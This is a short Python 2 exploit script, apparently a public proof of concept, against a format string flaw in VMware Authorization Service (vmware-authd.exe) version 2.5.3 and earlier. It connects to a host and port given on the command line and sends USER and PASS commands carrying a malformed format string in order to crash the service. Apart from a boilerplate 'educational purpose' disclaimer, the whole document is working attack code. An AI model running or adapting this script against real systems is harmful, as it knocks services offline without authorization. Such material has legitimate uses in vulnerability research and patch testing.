# ----------------------------------------------------------------------------
# VMware Authorization Service <= 2.5.3 (vmware-authd.exe) Format String DoS
# url: http://www.vmware.com/
#
# author: shinnai
# mail: shinnai[at]autistici[dot]org
# site: http://www.shinnai.net
#
# This was written for educational purpose. Use it at your own risk.
# Author will be not responsible for any damage.
#
# Tested on Windows XP Professional Ita SP3 full patched
# ----------------------------------------------------------------------------

# usage: C:\>exploit.py 127.0.0.1 912

import socket
import time
import sys

host = str(sys.argv[1])
port = int(sys.argv[2])

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    conn = s.connect((host, port))
    d = s.recv(1024)
    print "Server <- " + d

    s.send('USER \x25\xFF \r\n')
    print 'Sending command "USER" + evil string...'
    d = s.recv(1024)
    print "Server response <- " + d

    s.send('PASS \x25\xFF \r\n')
    print 'Sending command "PASS" + evil string...'
    try:
        d = s.recv(1024)
        print "Server response <- " + d
    except:
        print "\nExploit completed..."
except:
    print "Something goes wrong honey..."
